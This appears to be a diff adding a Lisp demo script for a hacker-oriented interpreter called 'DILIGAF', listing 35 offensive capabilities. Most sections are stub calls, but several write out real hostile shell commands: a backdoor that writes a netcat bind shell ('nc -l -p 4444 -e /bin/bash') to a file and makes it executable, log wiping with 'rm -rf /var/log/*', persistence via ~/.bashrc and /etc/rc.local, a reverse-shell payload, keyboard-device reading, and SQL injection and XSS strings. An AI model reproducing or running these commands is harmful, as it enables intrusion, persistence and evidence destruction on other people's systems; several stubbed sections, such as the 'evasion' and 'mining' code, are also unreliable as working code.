@@ -1,0 +1,237 @@
+;; DILIGAF Hacker Demo Script
+;; This demonstrates the core capabilities of DILIGAF in pure Lisp
+
+;; 1. Basic Lisp operations
+(define answer (+ 21 21))
+(print "The answer is:" answer)
+
+;; 2. System access and memory manipulation
+(define mem-addr 0x400000)
+(define data (mem-read mem-addr 16))
+(print "Memory at" mem-addr "contains:" data)
+
+;; 3. Network reconnaissance
+(define target "example.com")
+(define ports (list 22 80 443 8080))
+(define scan-results (port-scan target ports))
+(print "Port scan results:" scan-results)
+
+;; 4. HTTP exploitation
+(define url "http://httpbin.org/get")
+(define response (http-get url))
+(print "HTTP response status:" (car response))
+(print "Response body:" (cdr response))
+
+;; 5. Code obfuscation and XOR encryption
+(define secret "This is a secret message")
+(define key "hacker-key")
+(define encrypted (xor secret key))
+(print "Encrypted secret:" encrypted)
+
+;; 6. Payload generation
+(define rev-shell (payload :reverse-shell :host "192.168.1.100" :port 4444))
+(print "Reverse shell payload:" rev-shell)
+
+;; 7. Process injection (simulated)
+(define target-pid 1234)
+(define malicious-code "echo 'PWNED' > /tmp/pwned.txt")
+(inject target-pid malicious-code)
+
+;; 8. Packet crafting and spoofing
+(define fake-ip "192.168.1.50")
+(spoof fake-ip)
+(define packet (packet-craft "tcp" :src-port 12345 :dst-port 80 :flags "SYN"))
+(print "Crafted packet:" packet)
+
+;; 9. Hash cracking
+(define target-hash "5d41402abc4b2a76b9719d911017c592")
+(define wordlist (list "hello" "world" "password" "admin" "test"))
+(define cracked (crack target-hash wordlist :md5))
+(print "Cracked hash:" cracked)
+
+;; 10. Anti-debugging
+(define debug-check (anti-debug))
+(print "Debugger present:" debug-check)
+
+;; 11. Self-modifying code
+(define self-modify
+  (lambda (code)
+    (define new-code (polymorph code))
+    (print "Original:" code)
+    (print "Modified:" new-code)
+    new-code))
+
+(define original "alert('Hello World')")
+(define modified (self-modify original))
+
+;; 12. Fuzzing
+(define fuzz-pattern "GET /FUZZ HTTP/1.1\r\nHost: target.com\r\n\r\n")
+(define fuzz-results (fuzz "target.com" fuzz-pattern 10))
+(print "Fuzz results:" fuzz-results)
+
+;; 13. Dynamic function creation
+(define create-exploit
+  (lambda (target port)
+    (lambda ()
+      (print "Exploiting" target "on port" port)
+      (socket 2 1 0))))
+
+(define exploit-func (create-exploit "192.168.1.1" 80))
+(exploit-func)
+
+;; 14. Macro definition for common patterns
+(defmacro def-exploit (name target port)
+  `(define ,name
+     (lambda ()
+       (print "Exploiting" ,target "on port" ,port))))
+
+;; 15. Hot-swapping modules
+(define hot-swap
+  (lambda (module-name new-code)
+    (define old-module (assoc module-name modules))
+    (define new-module (list module-name new-code))
+    (set! modules (cons new-module (remove old-module modules)))
+    (print "Hot-swapped module:" module-name)))
+
+;; 16. Cross-platform system detection
+(define os (shell "uname -s"))
+(define arch (shell "uname -m"))
+(print "Operating System:" os)
+(print "Architecture:" arch)
+
+;; 17. Advanced obfuscation
+(define obfuscate-code
+  (lambda (code)
+    (define encoded (encode code :base64))
+    (define xored (xor encoded "secret-key"))
+    (define hexed (encode xored :hex))
+    hexed))
+
+(define obfuscated (obfuscate-code "malicious code here"))
+(print "Obfuscated code:" obfuscated)
+
+;; 18. Memory scanning
+(define scan-memory
+  (lambda (pattern start-addr end-addr)
+    (define results (list))
+    (define addr start-addr)
+    (while (< addr end-addr)
+      (define data (mem-read addr (length pattern)))
+      (if (= data pattern)
+          (set! results (cons addr results)))
+      (set! addr (+ addr 1)))
+    results))
+
+;; 19. Network interface enumeration
+(define interfaces (shell "ip link show"))
+(print "Network interfaces:" interfaces)
+
+;; 20. Process enumeration
+(define processes (proc-read "self/status"))
+(print "Process status:" processes)
+
+;; 21. Device access
+(define keyboard-data (dev-read "input/event0"))
+(print "Keyboard data:" keyboard-data)
+
+;; 22. Kernel module interaction
+(define load-module
+  (lambda (module-name)
+    (shell (string-append "insmod " module-name))))
+
+;; 23. File system manipulation
+(define create-backdoor
+  (lambda (path)
+    (define backdoor-code "#!/bin/bash\nnc -l -p 4444 -e /bin/bash")
+    (shell (string-append "echo '" backdoor-code "' > " path))
+    (shell (string-append "chmod +x " path))))
+
+;; 24. Registry manipulation (Windows)
+(define reg-write
+  (lambda (key value data)
+    (shell (string-append "reg add " key " /v " value " /t REG_SZ /d " data))))
+
+;; 25. Service manipulation
+(define start-service
+  (lambda (service-name)
+    (shell (string-append "systemctl start " service-name))))
+
+;; 26. Log manipulation
+(define clear-logs
+  (lambda ()
+    (shell "rm -rf /var/log/*")
+    (shell "echo 'Logs cleared' > /var/log/syslog")))
+
+;; 27. Persistence mechanisms
+(define add-persistence
+  (lambda (command)
+    (shell (string-append "echo '" command "' >> ~/.bashrc"))
+    (shell (string-append "echo '" command "' >> /etc/rc.local"))))
+
+;; 28. Steganography
+(define hide-data
+  (lambda (data file)
+    (define encoded (encode data :base64))
+    (shell (string-append "echo '" encoded "' >> " file))))
+
+;; 29. Cryptocurrency mining
+(define start-mining
+  (lambda (wallet-address)
+    (define mining-script
+      (string-append "while true; do echo 'Mining...'; sleep 1; done"))
+    (shell (string-append "nohup " mining-script " &"))))
+
+;; 30. Advanced evasion
+(define evade-detection
+  (lambda ()
+    (define random-delay (random 1000))
+    (sleep random-delay)
+    (define fake-process (string-append "fake-" (random 10000)))
+    (shell (string-append "ps aux | grep " fake-process))))
+
+;; 31. Self-modifying interpreter
+(define rewrite-interpreter
+  (lambda (new-functions)
+    (dolist (func new-functions)
+      (set! (gethash (car func) environment) (eval (cadr func))))
+    (print "Interpreter rewritten with" (length new-functions) "new functions")))
+
+;; 32. Dynamic DSL creation
+(define create-dsl
+  (lambda (name syntax-rules)
+    (define dsl-macro
+      (lambda (expr)
+        (apply-syntax-rules syntax-rules expr)))
+    (set! (gethash name macros) dsl-macro)
+    (print "DSL created:" name)))
+
+;; 33. Metaprogramming example
+(define generate-exploit
+  (lambda (target-type vulnerability)
+    (define exploit-code
+      (case target-type
+        (:buffer-overflow "strcpy(buffer, input)")
+        (:sql-injection "'; DROP TABLE users; --")
+        (:xss "<script>alert('XSS')</script>")
+        (t "generic exploit")))
+    (print "Generated exploit for" target-type ":" exploit-code)
+    exploit-code))
+
+;; 34. Code injection via macros
+(defmacro inject-code (target code)
+  `(progn
+     (print "Injecting code into" ,target)
+     (eval ,code)))
+
+;; 35. Runtime code generation
+(define generate-runtime-code
+  (lambda (template variables)
+    (define generated-code template)
+    (dolist (var variables)
+      (set! generated-code (substitute (cdr var) (car var) generated-code)))
+    (print "Generated code:" generated-code)
+    generated-code))
+
+;; Main execution
+(print "DILIGAF Hacker Demo Complete!")
+(print "All systems compromised. Mission accomplished.")
